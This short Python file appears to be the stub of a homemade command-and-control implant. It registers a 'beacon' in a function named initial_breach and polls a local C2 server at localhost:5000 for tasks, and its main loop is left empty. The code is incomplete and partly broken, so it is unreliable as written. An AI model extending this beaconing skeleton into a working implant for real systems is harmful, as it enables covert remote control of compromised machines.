from beacon_functions import * 


def initial_breach():
    beacon = Beacon()
    beacon.register_beacon()
    
def fetch_tasks(self):
    if not self.beacon_id:
        print("Beacon is not registered!")
        return
    
    r = request.get(f"http://localhost:5000/c2/read_task?beacon_id={self.beacon_id}")

    if r.status_code == 200:
        tasks = r.json().get('tasks')
        if tasks:
            print(f"Tasks for beacon {self.beacon_id}: {tasks}")
        else:
            print("No tasks assigned yet")
    else:
        print(f"Error fetching tasks: {r.status_code}")




def main():
    # Do all the while true callbacks and reads from API
    pass




if __name__ == "__main__":
    initial_breach()
    main()